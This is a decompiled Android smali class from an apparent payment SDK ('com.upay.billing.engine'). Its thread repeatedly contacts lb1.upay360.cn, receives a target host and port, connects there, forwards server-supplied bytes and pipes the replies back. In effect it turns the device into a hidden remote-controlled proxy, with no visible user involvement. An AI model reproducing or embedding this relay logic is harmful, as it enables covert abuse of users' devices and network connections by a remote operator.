.class final Lcom/upay/billing/engine/HttpClaimer$1;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic val$pollTime:J

.field final synthetic val$port:I


# direct methods
.method constructor <init>(IJ)V
    .locals 0

    iput p1, p0, Lcom/upay/billing/engine/HttpClaimer$1;->val$port:I

    iput-wide p2, p0, Lcom/upay/billing/engine/HttpClaimer$1;->val$pollTime:J

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 13

    const/4 v2, 0x0

    :goto_0
    :try_start_0
    new-instance v4, Ljava/net/Socket;

    const-string v0, "lb1.upay360.cn"

    iget v1, p0, Lcom/upay/billing/engine/HttpClaimer$1;->val$port:I

    invoke-direct {v4, v0, v1}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    const/16 v0, 0x64

    invoke-virtual {v4, v0}, Ljava/net/Socket;->setSoTimeout(I)V

    const/4 v0, 0x1

    const/4 v1, 0x2

    invoke-virtual {v4, v0, v1}, Ljava/net/Socket;->setSoLinger(ZI)V

    invoke-virtual {v4}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    const-string v0, "CLAIM HTTP-02"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    :cond_0
    invoke-virtual {v4}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    invoke-static {v3}, Lcom/upay/billing/engine/HttpClaimer;->readStream(Ljava/io/InputStream;)[B

    move-result-object v3

    if-eqz v3, :cond_1

    array-length v6, v3

    if-nez v6, :cond_2

    :cond_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    sub-long/2addr v6, v0

    const-wide/16 v8, 0xbb8

    cmp-long v6, v6, v8

    if-ltz v6, :cond_0

    :cond_2
    if-eqz v3, :cond_3

    array-length v0, v3

    if-nez v0, :cond_4

    :cond_3
    invoke-virtual {v4}, Ljava/net/Socket;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    iget-wide v0, p0, Lcom/upay/billing/engine/HttpClaimer$1;->val$pollTime:J

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0

    :cond_4
    :try_start_2
    invoke-static {v3}, Lcom/upay/billing/engine/HttpClaimer;->access$000([B)[Ljava/lang/Object;

    move-result-object v1

    new-instance v6, Ljava/net/Socket;

    const/4 v0, 0x0

    aget-object v0, v1, v0

    check-cast v0, Ljava/lang/String;

    const/4 v7, 0x1

    aget-object v1, v1, v7

    check-cast v1, Ljava/lang/Integer;

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-direct {v6, v0, v1}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    const/16 v0, 0x64

    invoke-virtual {v6, v0}, Ljava/net/Socket;->setSoTimeout(I)V

    const/4 v0, 0x1

    const/4 v1, 0x2

    invoke-virtual {v6, v0, v1}, Ljava/net/Socket;->setSoLinger(ZI)V

    invoke-virtual {v6}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-static {v3}, Lcom/upay/billing/engine/HttpClaimer;->access$100([B)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    move v3, v2

    :goto_1
    invoke-virtual {v6}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-static {v0, v5}, Lcom/upay/billing/engine/HttpClaimer;->pipeStream(Ljava/io/InputStream;Ljava/io/OutputStream;)I

    move-result v1

    if-lez v1, :cond_7

    move v0, v1

    :goto_2
    add-int/2addr v0, v3

    if-gtz v1, :cond_5

    if-nez v0, :cond_6

    :cond_5
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    sub-long/2addr v9, v7

    const-wide/16 v11, 0x4e20

    cmp-long v1, v9, v11

    if-ltz v1, :cond_8

    :cond_6
    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v6}, Ljava/net/Socket;->close()V

    invoke-virtual {v4}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :goto_3
    :try_start_3
    iget-wide v0, p0, Lcom/upay/billing/engine/HttpClaimer$1;->val$pollTime:J

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v0

    goto/16 :goto_0

    :cond_7
    move v0, v2

    goto :goto_2

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_3

    :cond_8
    move v3, v0

    goto :goto_1
.end method
